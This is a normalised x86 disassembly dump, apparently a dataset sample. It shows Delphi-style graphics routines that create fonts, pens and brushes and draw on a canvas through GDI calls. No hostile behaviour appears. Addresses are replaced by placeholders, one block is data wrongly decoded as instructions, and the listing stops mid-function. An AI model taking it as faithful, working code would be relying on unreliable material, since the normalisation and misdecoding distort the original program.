lea edx [ eax + 0x10 ]
mov eax ebx
call sub_402968
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407f48
test al al
je r-xdata
sub_423bfc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_423b00
xor ecx ecx
push ebp
push sub_423c83
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423b0c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_423cac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423b00
xor eax eax
push ebp
push sub_423d15
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423b18
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_423bfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d1c
mov eax [ ebp - 0x4 ]
call sub_423b0c
retn
mov eax ebx
mov si 0xfffd
call sub_4033e8
sub_423d24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423b00
xor eax eax
push ebp
push sub_423d80
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d87
mov eax [ ebp - 0x4 ]
call sub_423b0c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_4033e8
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423bfc
sub_423d90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423b00
xor edx edx
push ebp
push sub_423def
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423df6
mov eax [ ebp - 0x4 ]
call sub_423b0c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_423dfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_419188
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423e99
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418dc4
mov ebx eax
mov eax ebx
call sub_42538c
inc [ ebp - 0x4 ]
mov eax ebx
call sub_425758
mov eax [ rw-data ]
call sub_423d90
mov eax [ rw-data ]
call sub_423d90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ea0
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418dc4
call sub_425630
inc esi
dec ebx
jne r-xdata
sub_4244ef
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4186e8
retn
sub_424520
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402cf8
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402ae8
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_4245d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423b18
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_424628
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423bfc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42466c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4193d8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42432c
xor eax eax
push ebp
push sub_424727
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42432c
xor eax eax
push ebp
push sub_42470a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423d24
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4247a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424711
mov eax [ ebp - 0x8 ]
call sub_42433c
retn
mov eax ebx
call sub_424a2c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424a48
sub_424758
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42432c
xor eax eax
push ebp
push sub_42479d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423cac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4247a4
mov eax [ ebp - 0x4 ]
call sub_42433c
retn
sub_4247bc
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424945
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42494c
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403fa0
retn
mov eax [ rw-data ]
call sub_423b00
xor eax eax
push ebp
push sub_42491d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423b0c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041e0
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408a2c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4041e0
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408a2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041e0
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_40804c
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_424aa0
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_424964
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_424520
mov edx esp
mov eax ebx
call sub_424758
add esp 0x2c
pop esi
pop ebx
retn
sub_424990
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424740
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424758
add esp 0x2c
pop esi
pop ebx
retn
sub_4249d0
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424740
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402bf8
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404218
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402ae8
mov edx esp
mov eax ebx
call sub_424758
sub_424a48
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_424990
pop esi
pop ebx
retn
sub_424a74
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424740
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424758
add esp 0x30
pop ebx
retn
sub_424aa8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424740
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_424758
add esp 0x2c
pop esi
pop ebx
retn
sub_424ad8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424740
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_424758
add esp 0x2c
pop esi
pop ebx
retn
sub_424b00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423b18
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_424b44
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423bfc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_424b6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4193d8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42432c
xor eax eax
push ebp
push sub_424c0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42432c
xor eax eax
push ebp
push sub_424bee
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423d24
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424d54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424bf5
mov eax [ ebp - 0x8 ]
call sub_42433c
retn
sub_424c24
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424c3c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42432c
xor eax eax
push ebp
push sub_424c81
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423cac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c88
mov eax [ ebp - 0x4 ]
call sub_42433c
retn
sub_424c94
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424c24
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424c3c
add esp 0x10
pop esi
pop ebx
retn
sub_424cbc
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423b00
xor eax eax
push ebp
push sub_424d42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423b0c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4242e8
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_424d70
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424c24
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_424c3c
add esp 0x10
pop esi
pop ebx
retn
sub_424da0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424c24
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_424c3c
sub_424dcc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423b18
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_424e0c
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423bfc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_424e34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4193d8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42432c
xor eax eax
push ebp
push sub_424ec4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42432c
xor eax eax
push ebp
push sub_424ea7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423d24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424eae
mov eax [ ebp - 0x8 ]
call sub_42433c
retn
sub_424edc
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424ef8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42432c
xor eax eax
push ebp
push sub_424f3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423cac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f44
mov eax [ ebp - 0x4 ]
call sub_42433c
retn
sub_424f48
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424ef8
add esp 0x10
pop edi
pop esi
retn
sub_424f74
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424edc
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424ef8
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424fa8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_423b00
xor edx edx
push ebp
push sub_425075
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423b0c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4242e8
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_425090
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424edc
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424ef8
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_4250c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425980
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424b00
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4259a0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dcc
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4259c0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_419100
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_425188
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41919c
xor edx edx
mov eax esi
call sub_4257b8
mov eax [ esi + 0xc ]
call sub_4031ec
mov eax [ esi + 0x10 ]
call sub_4031ec
mov eax [ esi + 0x14 ]
call sub_4031ec
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4251e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42580c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_42526c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
mov eax [ ebx + 0x14 ]
call sub_424f6c
call sub_4242e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4242e8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41776c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_425318
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
mov eax [ ebx + 0x14 ]
call sub_424fa8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_425354
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4253b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_4253e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_425418
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42580c
mov eax [ ebp + 0x8 ]
push eax
